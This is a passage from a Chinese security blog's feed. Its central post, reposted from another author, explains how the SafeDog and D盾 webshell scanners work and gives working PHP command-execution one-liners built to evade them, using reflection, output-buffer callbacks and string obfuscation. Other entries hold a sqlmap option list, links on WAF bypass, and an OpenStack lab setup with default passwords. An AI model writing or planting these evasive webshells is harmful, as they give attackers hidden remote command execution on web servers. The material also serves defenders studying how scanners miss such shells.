dork结果显示网页排名（PR）</p><p>–parse-errors 从响应页面解析数据库管理系统的错误消息</p><p>–replicate 复制转储的数据到一个sqlite3数据库</p><p>–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址</p><p>–wizard 给初级用户的简单向导界面</p><p><font color="#880000">Options（选项）：</font></p><p>-version 显示程序的版本号并退出</p><p>-h, –help 显示此帮助消息并退出</p><p>-v VERBOSE 详细级别：0-6（默认为1）</p><p>&nbsp;</p><p><b>注入姿势：</b></p><p><a href="http://www.secbox.cn/hacker/6311.html" target="_blank" rel="external">http://www.secbox.cn/hacker/6311.html</a></p><p><a href="http://www.secbox.cn/hacker/3789.html" target="_blank" rel="external">http://www.secbox.cn/hacker/3789.html</a></p><p><a href="http://404.so/7309.html" target="_blank" rel="external">http://404.so/7309.html</a></p><p><a href="http://www.myhack58.com/Article/html/3/7/2016/80301_2.htm" target="_blank" rel="external">http://www.myhack58.com/Article/html/3/7/2016/80301_2.htm</a></p><p><a href="http://www.qingpingshan.com/pc/aq/154823.html" target="_blank" rel="external">http://www.qingpingshan.com/pc/aq/154823.html</a></p><p>过狗：</p><p><a href="http://www.freebuf.com/articles/1000.html" target="_blank" rel="external">http://www.freebuf.com/articles/1000.html</a></p><p><a href="http://www.vuln.cn/2086" target="_blank" rel="external">http://www.vuln.cn/2086</a></p><p><a href="http://www.360doc.com/content/16/0330/05/7944896_546425071.shtml" target="_blank" rel="external">http://www.360doc.com/content/16/0330/05/7944896_546425071.shtml</a></p><p><a href="http://www.myhack58.com/Article/html/2/5/2016/76932.htm" target="_blank" rel="external">http://www.myhack58.com/Article/html/2/5/2016/76932.htm</a></p><p><a href="http://blog.csdn.net/qq_29277155/article/details/51193071" target="_blank" rel="external">http://blog.csdn.net/qq_29277155/article/details/51193071</a></p><p><br></p><p><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;b&gt;基础&lt;/b&gt;&lt;/p&gt;&lt;p&gt;SQLmap是一款用来检测与利用SQL注入漏洞的免费开源工具。主要可以用来判断可注入的参数、注入的方式，识别数据库种类，读取数据，命令执行等作用。&lt;/p&gt;&lt;p&gt;&lt;font color=&quot;#880000&quot;&gt;注入模式&lt;/font&gt;：基于布尔的盲注、基于时间的盲注、基于报错注入、联合查询注入、堆查询注入&lt;/p&gt;&lt;p&gt;&lt;font color=&quot;#880000&quot;&gt;支持的数据库&lt;/font&gt;：MySQL, Oracle, PostgreSQL, Microsoft SQL Server,
    
    </summary>
    
      <category term="神器" scheme="http://sunu11.com/categories/%E7%A5%9E%E5%99%A8/"/>
    
    
      <category term="sqlmap" scheme="http://sunu11.com/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>过狗总结（转）</title>
    <link href="http://sunu11.com/2016/11/05/5/"/>
    <id>http://sunu11.com/2016/11/05/5/</id>
    <published>2016-11-05T05:31:28.000Z</published>
    <updated>2017-03-21T05:43:38.000Z</updated>
    
    <content type="html"><![CDATA[<p> </p><h3>xx狗静态查杀大致分析</h3><p>目前，传统的WAF软件主要通过定时或是由管理员手动对网站<a id="more"></a>程序进行查杀的主动方式以及当请求者浏览该文件时由WAF软件被动的方式进行查杀。而查杀的原理主要是通过对目标文件的特征与网马规则库进行比对。这种查杀原理有它的局限性，攻击者可以利用脚本语言的特性对已被查杀出来的WebShell进行伪装成类似正常的页面程序从而避开WAF软件的查杀。</p><p>因为狗的查杀并没有相关资料或文档等。不过，我们仍然可以从狗的查杀中得到部分结论。<br></p><ul><li>利用正则表达式<br></li></ul><p>这种方法最大的好处就是简单。但是，正则表达式最大的缺点就是其只对关键危险函数进行检查。也就是说，我们将关键函数稍微通过某种方式变换一下，正则表达式无法查杀了。而且，这种方法的误报率也很高。所以，这种方法的查杀效果不是很理想。但是这种方法最大的好处就是简单，速度快。一般在查杀web目录下的图片等文件时使用此种方法。</p><li>利用PHP代码分析技术<br></li><p>这种方法最大的好处是解决了正则查杀误报率过高的问题。在这里，我们可以大致分析一下查杀引擎的工作原理：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对PHP文件做预处理，去除掉注释，空格，等没有用的东西</p><p>我们可以在php中写入以下内容</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/<em>system(“$_get[‘x’]”);</em>/</span><span class="hljs-meta">?&gt;</span></code></pre><p>使用和d盾查杀，发现没有查杀出一句话。原来查杀引擎在查杀的时候，会做类似于编译器的优化，去掉一些乱七八糟的东西。也许你会认为代码写在注释里，php的编译器也会做类似优化操作，将其去除。而且，代码在注释里也不可能运行的。所以你可能会认为的查杀方式很正确。既简单又高效，为下一步处理降低了负担。</p><p>但是其实是不正确的。查阅php manual，在PHP 5 &gt;= 5.1.0, PHP 7 中，php官方提供了一个函数<span style="font-family: Menlo, Monaco, Consolas, &quot;Courier New&quot;, monospace; font-size: 1em;">ReflectionClass::getDocComment。</span>简而言之，这个函数最主要的作用是获取php的注释。我们可以通过这个函数获取文档中注释，然后通过php的动态函数调用等xxxx各种方法去执行我们所获取到的代码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步预处理所得到的结果做词法分析。以下代码</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">$a=<span class="hljs-string">“system(@$_get[‘x’])”</span></code></pre><p>和</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1">system(@$_get[<span class="hljs-string">‘x’</span>])</code></pre><p>我们分别去查杀这两个文件。结果显而易见，第一个没有办法去查杀，而第二个一定会被查杀。由此，我们可以得出结论，查杀引擎会对php文件做词法分析，然后只对相关函数调用等再做进一步查杀。而类似于字符串等这样变量，查杀引擎基本上会直接将其舍弃。不再做进一步分析。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;对上一步结果进行语法分析</p><p>从这一步开始，查杀引擎开始对相关函数的调用进行语法分析。分析变量作用域，函数参数调用等。再与webshell特征库进行比对，用以确定是否为webshell文件。</p><p>在查杀引擎中，基本上会对if等条件控制条件直接跳过，直接分析里面的代码。例如下面的例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-keyword">if</span> (<span class="hljs-keyword">false</span>)<br>  {<br>    system(<span class="hljs-string">‘@$_get[‘</span>x<span class="hljs-string">‘]’</span>);<br>}</code></pre><p>这段代码在php文件进行编译的时候，会对其进行分支优化。也就是说，这段代码因为if语句中为false，属于死码，永远不会运行，所以编译器会将其删除掉。但是换做查杀引擎，会直接查杀并报警。据我猜测，php的控制流程跳转那么多，如果查杀引擎也像编译器那样做分支结构的优化，势必会造成查杀效率的降低。所以没办法，只好不管分支结构，直接查杀。</p><h3>躲避查杀的方法</h3><p>上面大致介绍了两种查杀引擎的办法，虽然比较粗略，但是也给了我们躲避查杀的思路。那就是，想办法隐藏关键的特征码。</p><ul><li>利用php反射技术</li></ul><p>反射是在PHP运行状态中，扩展分析PHP程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。反射是操纵面向对象范型中元模型的API，其功能十分强大，可帮助我们构建复杂，可扩展的应用。其用途如：自动加载插件，自动生成文档，甚至可用来扩充PHP语言。</p><p>也就是说，我们可以利用反射去加载system函数，通过反射去传参。因为在反射中，system这个特征码只不过是字符串，所以我们很容易对其进行加解密等操作去躲开查杀引擎的查杀。</p><p>过狗例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$func = <span class="hljs-keyword">new</span> ReflectionFunction(<span class="hljs-string">“system”</span>);<br><span class="hljs-keyword">echo</span> $func-&gt;invokeArgs(<span class="hljs-keyword">array</span>(<span class="hljs-string">“$_GET[c]”</span>));<span class="hljs-meta">?&gt;</span></code></pre><p>这个安全狗查不到，但是d盾可以查到，而d盾查杀结果是可疑函数调用，基本上等于没查到。下面来一段d盾和都查不到的shell</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorld</span> </span>{<p></p><p>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sayHelloTo</span><span class="hljs-params">($name)</span> </span>{<br>      $last_line = system($name);<br>              <span class="hljs-keyword">return</span> $last_line;<br>  }<br>}<br>$a=$_GET[<span class="hljs-string">“a”</span>];<br>$reflectionMethod = <span class="hljs-keyword">new</span> ReflectionMethod(<span class="hljs-string">‘HelloWorld’</span>, <span class="hljs-string">‘sayHelloTo’</span>);<br><span class="hljs-keyword">echo</span> $reflectionMethod-&gt;invoke(<span class="hljs-keyword">new</span> HelloWorld(), $a);<br><span class="hljs-meta">?&gt;</span><br></p></code></pre><p>利用反射类中函数的办法去执行危险函数</p><ul><li>利用php的callback方法<br></li></ul><p>自 PHP 5.4 起可用 <a href="http://php.net/manual/zh/language.types.callable.php" target="_blank" rel="external">callable</a>&nbsp;类型指定回调类型 callback。本文档基于同样理由使用 <a href="#language.types.callback">callback</a>&nbsp;类型信息。一些函数如 <a href="http://php.net/manual/zh/function.call-user-func.php" target="_blank" rel="external">call_user_func()</a>&nbsp;或 <a href="http://php.net/manual/zh/function.usort.php" target="_blank" rel="external">usort()</a>&nbsp;可以接受用户自定义的回调函数作为参数。回调函数不止可以是简单函数，还可以是对象的方法，包括静态类方法。也就是说，callback也可以接受一个字符串变量，并将其作为函数去执行。下面是例子</p><pre style="max-width:100%;overflow-x:auto;"><code class="php hljs" codemark="1"><span class="hljs-meta">&lt;?php</span>$cb= <span class="hljs-string">‘system’</span>;ob_start($cb);<span class="hljs-keyword">echo</span> $_GET[c];ob_end_flush();<span class="hljs-meta">?&gt;</span></code></pre><p>在php中回调函数有很多，打开php的官方手册，找到支持callback的函数，基本上都可以用来做过狗一句话</p><ul><li>特征码的变形隐藏<br></li></ul><p>在上面的例子中，我们已经成功的将函数调用转换为字符串类型，然后通过反射等方式去执行。但是我们还需要躲避正则匹配等查杀引擎，这里还需要对特征码变形。当然了，这里变形的操作就很多了，例如base64加密，gzip压缩，或者，也可以自己写一段加解密字符串的函数。这里就不详细介绍了。</p><p>过狗的例子有很多，这里只不过给出思路。php作为一门弱类型的语言，可扩展性，灵活性比java一类等语言强很多。但是过于灵活也会导致很多安全问题。在静态查杀中，很容易躲避查杀，造成漏报等问题。所以在安全狗的博客中，也讲了静态查杀不太靠谱，还是防御好黑客上传shell才是正道，使其没有上传webshell的机会。</p><p>初次写文章，有些地方可能会有技术上的问题，望大牛斧正批评。也望各路大神交流过狗思路，共同学习进步。</p><p>参考资料</p><p></p><ul><li><a href="http://blog.safedog.cn/?p=77" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://blog.safedog.cn/?p=77</a>&nbsp; &nbsp; &nbsp; 一种理想的网站木马防护思路探究<br></li><li><a href="http://php.net/manual/zh/language.types.callable.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://php.net/manual/zh/language.types.callable.php</a>&nbsp; &nbsp; &nbsp; &nbsp; phpcallback<br></li><li><a href="https://secure.php.net/manual/zh/reflectionfunction.invoke.php" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://secure.php.net/manual/zh/reflectionfunction.invoke.php</a>&nbsp;php &nbsp; 反射<br></li><li><a href="https://security.tencent.com/index.php/blog/msg/58" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">https://security.tencent.com/index.php/blog/msg/58</a>&nbsp;TSRC<br></li><li>挑战赛： PHP防御绕过挑战实录<br></li><li><a href="http://wrox.cn/article/100032494/" style="background-color: rgb(255, 255, 255);" target="_blank" rel="external">http://wrox.cn/article/100032494/</a>&nbsp;未知攻焉知防 — Webshell变形技术集锦<br></li></ul><p></p><p><font face="Times New Roman" size="2">文／烤土豆啦（简书作者）原文链接：<a href="http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。" target="_blank" rel="external">http://www.jianshu.com/p/a23fbd1825c8著作权归作者所有，转载请联系作者获得授权，并标注“简书作者”。</a></font></p><p><br></p><p><br></p><p></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; &lt;/p&gt;&lt;h3&gt;xx狗静态查杀大致分析&lt;/h3&gt;&lt;p&gt;目前，传统的WAF软件主要通过定时或是由管理员手动对网站
    
    </summary>
    
      <category term="shell" scheme="http://sunu11.com/categories/shell/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>OpenStack云计算平台初体验</title>
    <link href="http://sunu11.com/2016/10/30/3/"/>
    <id>http://sunu11.com/2016/10/30/3/</id>
    <published>2016-10-30T12:14:50.000Z</published>
    <updated>2016-11-28T15:32:03.000Z</updated>
    
    <content type="html"><![CDATA[ <p><b><font face="楷体" size="4">简介</font></b></p><p>OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目;是IaaS(基础设施即服务)组件，让任何人都可以自行建立和提供云端运算服务。此外，OpenStack也用作建立防火墙内的“私有云”（Private&nbsp;Cloud），提供机构或企业内各部门共享资源。</p><p><b><font face="楷体" size="4">构建思路</font></b></p><p>第一步是设置正确的硬件和网络环境。尽管OpenStack允许在一个单一的平面网络上部署一切，从安全的角度来看并不安全。<a id="more"></a>取决于你所使用的管理程序以及虚拟网络接口，它会允许guest虚拟机嗅探管理流量。建议至少使用两个网络：一个用来管理流量，一个用来进行虚拟机之间的对话。这意味着所有的云计算结点中你需要两个网卡（一个运行实例）和网络管理者。这些应该运行在不同的IP范围中。计算结点和实例的网络也需要支持VLAN标记，因为这是在“项目”之间隔绝流量所使用的机制。一个项目等价于你的亚马逊EC2账户，除了你不能按照你所希望的数目创建和分配之外。每一个项目都有自己的管理员和用户，在既定项目中的所有实例可以彼此通信。通过指派每一个项目自己的VLAN以及内部和外部的IP地址池来执行。</p><p>一旦硬件和网络设置好，下一步就是确定在哪里部署所有的OpenStack组件。标准部署应有一个控制器和一系列计算结点。控制器运行消息服务器，数据库和其他的组件来编排云，同时计算结点运行实例。但是你也可以分解控制器为地理的部分，从而改善性能，像把MySQL放在不同的物理盒中。对于安全而言，最关键的是确保每一部分都安装在安全的主机上，你只需要将其附加在网络上，让云运转即可。</p><p>只有两部分需要暴露给外面的世界（即使那只是你的企业网络）：API服务器/Web 控制台（如果开启）和网络管理者。这些服务器需要过硬，你甚至可以使用第三方网络接口来隔离后端管理用户连接产生的流量。</p><p><b><font face="楷体" size="4">操作</font></b></p><p><font size="3" face="楷体">准备</font></p><p>环境: windows系统，openstack云平台（172.17.142.2 cloud.X.X.cn）<br></p><p>修改windows系统主机名称&amp;IP地址映射文件：/windows/system32/drivers/etc/hosts<br></p><p>追加：172.17.142.2&nbsp;&nbsp;&nbsp;&nbsp;cloud.X.X.cn<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;172.17.143.130&nbsp;&nbsp;controller<br></p><p>ip地址172.17.143.130要根据后面绑定控制节点浮动ip来修改。<br></p><p>以用户名test，密码test登录云平台<a href="https://cloud.X.X.cn。" target="_blank" rel="external">https://cloud.X.X.cn。</a></p><p><span style="font-family: 楷体; font-size: medium;">网络管理</span></p><p>1、创建网络<br></p><p>&nbsp;网络名称：135043204_network<br></p><p>&nbsp;网络地址：192.32.4.0/24<br></p><p>&nbsp;gateway: 192.32.4.254<br></p><p>&nbsp;地址池：192.32.4.10,192.32.4.200<br></p><p>&nbsp; DNS：211.71.232.65</p><p><img style="max-width: 100%; width: 602.8px; height: 114.4px;" src="http://ofum8yjv2.bkt.clouddn.com/a.png" class=""><span style="font-family: 宋体; font-size: medium;"><br></span></p><p>2、创建路由器135043204_router<br></p><p>&nbsp; &nbsp; &nbsp;选择外部网络：admin_floating_net&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br></p><p>&nbsp; &nbsp; &nbsp;配置路由器135043204_router，增加接口：选择子网135043204_network</p><p align="left" style="text-align: left;"><img style="max-width: 100%; width: 587.4px; height: 185.9px;" src="http://ofum8yjv2.bkt.clouddn.com/b.png" class=""></p><p align="left" style="text-align: left;"><span style="font-family: 楷体; font-size: medium;">安装配置控制节点</span></p><p>1、以快照镜像mitaka-controller启动虚拟机；<br></p><p>2、实例名称为：135043204_controller，可用域：nova，实例数：1<br></p><p>&nbsp; &nbsp; &nbsp;源选实例快照：mitaka-controller<br></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;flavor:4core8gram10gdisk&nbsp;</p><p>&nbsp; &nbsp; &nbsp;网络先选:135043204_network,再选ext_network<font color="#ff00ff">（tips：在选择网络时，系统默认为第一个网卡的网 &nbsp; 络建立路由）</font></p><p>&nbsp; &nbsp; &nbsp;安全组选：default<br></p><p>&nbsp; &nbsp; &nbsp;秘钥对选：创建135043204</p><p>&nbsp; &nbsp; &nbsp;启动实例。</p><p>&nbsp; &nbsp; &nbsp;绑定浮动ip（tips根据此浮动ip,修改/windows/system32/drivers/etc/hosts文件中的controller对应的ip.）</p><p><img style="max-width: 100%; width: 607.2px; height: 139.7px;" src="http://ofum8yjv2.bkt.clouddn.com/c.png" class=""><br></p><p>3、通过浮动ip远程连接controller<br></p><p>&nbsp; &nbsp; &nbsp;直接通过Xshell，选择public&nbsp;key认证方法，导入创建的私钥135043204，用户名为：centos连接。</p><p>&nbsp; &nbsp; &nbsp;连接后，切换到root身份,root密码为huawei</p><p>&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;su&nbsp;-<br></p><p>&nbsp; &nbsp; &nbsp;修改/etc/ssh/sshd_config<br></p><p>&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快速定位password<br></p><p>&nbsp; &nbsp; &nbsp;将PasswordAuthentication&nbsp;no行中的no修改为yes</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;PasswordAuthentication&nbsp;yes</p><p>&nbsp; &nbsp; &nbsp;存盘退出。<br></p><p>&nbsp; &nbsp; &nbsp;重启sshd服务。<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;sshd<br></p><p>&nbsp; &nbsp; &nbsp;服务查看,注意颜色为红色的服务名称。<br></p><p>&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl<br></p><p>&nbsp; &nbsp; &nbsp;禁用cloud相关服务<br></p><p>&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-local<br></p><p>&nbsp; &nbsp; &nbsp;主机名查看</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; hostname</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cat&nbsp;/etc/hostname &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</p><p>&nbsp; &nbsp; &nbsp;主机名设置<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;hostnamectl&nbsp;set-hostname&nbsp;controller<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat&nbsp;/etc/hostname&nbsp;<br></p><p>&nbsp; &nbsp; &nbsp;ip&nbsp;查看</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;ip&nbsp;a</p><p>&nbsp; &nbsp; &nbsp;配置ip&amp;host映射<br></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/hosts<br></p><p>&nbsp; &nbsp; &nbsp;修改controller对应的ip，（tips：compute对应的ip根据计算节点ip来修改。）<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.13&nbsp;controller<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;192.32.4.15&nbsp;compute</p><p><img style="max-width: 100%; width: 585.2px; height: 348.7px;" src="http://ofum8yjv2.bkt.clouddn.com/d.png" class=""><br></p><p>&nbsp; &nbsp; &nbsp;配置nosql数据库，修改bind_ip为192.32.4.13<br></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/mongod.conf&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mongod</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/e.png" class=""><br></p><p>&nbsp; &nbsp; &nbsp;配置mysql数据库,修改bind-address为192.32.4.13</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/my.cnf.d/openstack.cnf&nbsp;</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;mariadb</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/d.png" class=""><br></p><p>&nbsp; &nbsp; &nbsp;重启rabbitmq-server<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;rabbitmq-server</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/g.png"><br></p><p>&nbsp; &nbsp; &nbsp;配置&nbsp;linuxbridge_agent，配置physical_interface_mappings，local_ip&nbsp;，配置local_ip为192.32.4.13<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;<br></p><p>&nbsp; &nbsp; &nbsp;重启neutron-linuxbridge-agent<br></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/h.png" class=""></p><p>&nbsp; &nbsp; &nbsp;查看日志：<br></p><p>&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cat /var/log/neutron/linuxbridge-agent.log</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/dhcp-agent.log</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;cat /var/log/neutron/server.log</p><p>&nbsp; &nbsp; &nbsp;重启controller</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;reboot</p><p><span style="font-family: 楷体; font-size: medium;">安装配置计算节点</span></p><p>以快照镜像mitaka-compute启动虚拟机；<br></p><p>实例名称为：135043204_compute，可用域：nova，实例数：1<br></p><p>源选实例快照：mitaka-compute<br></p><p>flavor:2core4g_10g<br></p><p>网络选:135043204_network,ext_network<br></p><p>安全组选：default<br></p><p>秘钥对选：135043204<br></p><p>单击启动实例。绑定浮动ip。</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/i.png"><br></p><p>通过浮动ip远程连接compute<br></p><p>直接通过Xshell，选择public&nbsp;key认证方法，使用私钥135043204，用户名为：centos连接。<br></p><p>连接后，切换到root身份<br></p><p>su&nbsp;-<br></p><p>修改/etc/ssh/sshd_config<br></p><p>快速定位password<br></p><p>将PasswordAuthentication&nbsp;no行中的no修改为yes<br></p><p>PasswordAuthentication&nbsp;yes<br></p><p>存盘退出。<br></p><p>重启sshd服务。<br></p><p>systemctl&nbsp;restart&nbsp;sshd</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/j.png"><br></p><p>服务查看<br></p><p>systemctl<br></p><p>禁用cloud相关服务<br></p><p>systemctl&nbsp;disable&nbsp;cloud-config&nbsp;cloud-init&nbsp;cloud-final&nbsp;cloud-init-local<br></p><p>主机名查看<br></p><p>&nbsp;&nbsp;hostname<br></p><p>&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;<br></p><p>主机名设置<br></p><p>&nbsp;&nbsp;hostnamectl&nbsp;set-hostname&nbsp;compute<br></p><p>&nbsp;&nbsp;cat&nbsp;/etc/hostname&nbsp;<br></p><p>ip&nbsp;查看<br></p><p>&nbsp;&nbsp;ip&nbsp;a</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/k.png"><br></p><p>配置ip&amp;host映射<br></p><p>&nbsp; &nbsp; &nbsp;vi&nbsp;/etc/hosts<br></p><p>配置&nbsp;linuxbridge_agent，配置physical_interface_mappings，local_ip&nbsp;<br></p><p>&nbsp;&nbsp;&nbsp;&nbsp;vi&nbsp;/etc/neutron/plugins/ml2/linuxbridge_agent.ini&nbsp;<br></p><p>&nbsp;&nbsp;&nbsp;&nbsp;local_ip&nbsp;=&nbsp;&nbsp;192.32.4.15<br></p><p>重启neutron-linuxbridge-agent<br></p><p>&nbsp;&nbsp;&nbsp;systemctl&nbsp;restart&nbsp;neutron-linuxbridge-agent<br></p><p>&nbsp;&nbsp;&nbsp;查看日志：<br></p><p>&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/linuxbridge-agent.log&nbsp;<br></p><p>&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/dhcp-agent.log&nbsp;<br></p><p>&nbsp;&nbsp;&nbsp;cat&nbsp;/var/log/neutron/server.log&nbsp;<br></p><p>配置/etc/nova/nova.conf，配置my_ip<br></p><p>&nbsp;&nbsp;my_ip&nbsp;=&nbsp;192.32.4.15</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/l.png" class=""></p><p>重新启动openstack-nova-compute<br></p><p>systemctl restart openstack-nova-compute</p><p>&nbsp;reboot</p><p><span style="font-family: 楷体; font-size: medium;">测试</span></p><p>1、以管理员身份登录<a href="http://controller/dashboard" target="_blank" rel="external">http://controller/dashboard</a></p><p>domain:default</p><p>user name:admin</p><p>password:ADMIN_PASS</p><p>创建云主机类型</p><p>S135043199:1vcpu,64Mram,1g硬盘</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/m.png" class=""><br></p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/n.png"><br></p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/n.png"><br></p><p>2、以普通用户身份登录<a href="http://controller/dashboard" target="_blank" rel="external">http://controller/dashboard</a></p><p>domain:default</p><p>user name:demo</p><p>password:DEMO_PASS</p><p>创建2个云主机</p><p>实例名称:s135043199</p><p>镜像:cirros</p><p>flavor:s135043199</p><p>network:    selfservice</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/o.png"><br></p><p>3、通过控制台访问创建好的虚拟机s135043199-2</p><p>用户名cirros、密码cubswin:)</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/p.png"><br></p><p>测试两台虚拟机的连通性。</p><p><img style="max-width:100%;" src="http://ofum8yjv2.bkt.clouddn.com/q.png" class=""><br></p><p>到此私有云平台就部署并测试成功。</p><p>&nbsp;</p><p><font face="楷体" size="4"><b>安全性建议</b></font>（–取自百度百科）：</p><p><em> MySQL服务器使用指定的用户账户，不是根MySQL管理账户。这个账户和密码将会暴露在每一个云结点上，即使使用基于证书的认证，因此所有结点需要访问这个数据库服务器。</em></p><p> MySQL配置文件中，限制访问服务器，OpenStack用户账户为唯一授权IP地址。</p><p><em> 移除任何不需要的OS组件并确保你所设置的服务器只支持通过SSH的基于密钥的登陆。</em></p><p> 默认MySQL和RabbitMQ（消息服务器）流量不加密。如果你隔离了管理网络和坚固的主机，这就不应该是一个很糟糕的风险。如果你的云网络易于嗅探（例如，它和其他服务器共享网络），你需要加密流量。你可以使用OpenSSL来进行MySQL 和RabbitMQ处理。）</p><p><br></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;b&gt;&lt;font face=&quot;楷体&quot; size=&quot;4&quot;&gt;简介&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目;是IaaS(基础设施即服务)组件，让任何人都可以自行建立和提供云端运算服务。此外，OpenStack也用作建立防火墙内的“私有云”（Private&amp;nbsp;Cloud），提供机构或企业内各部门共享资源。&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;font face=&quot;楷体&quot; size=&quot;4&quot;&gt;构建思路&lt;/font&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;第一步是设置正确的硬件和网络环境。尽管OpenStack允许在一个单一的平面网络上部署一切，从安全的角度来看并不安全。
    
    </summary>
    
      <category term="cloud" scheme="http://sunu11.com/categories/cloud/"/>
    
    
      <category term="OpenStack" scheme="http://sunu11.com/tags/OpenStack/"/>
    
  </entry>
  
  <entry>
    <title>工具系列之Burpsuite学习</title>
    <link href="http://sunu11.com/2016/10/13/2/"/>
    <id>http://sunu11.com/2016/10/13/2/</id>
    <published>2016-10-13T06:44:41.000Z</published>
    <updated>2016-11-28T15:31:29.000Z</updated>
    
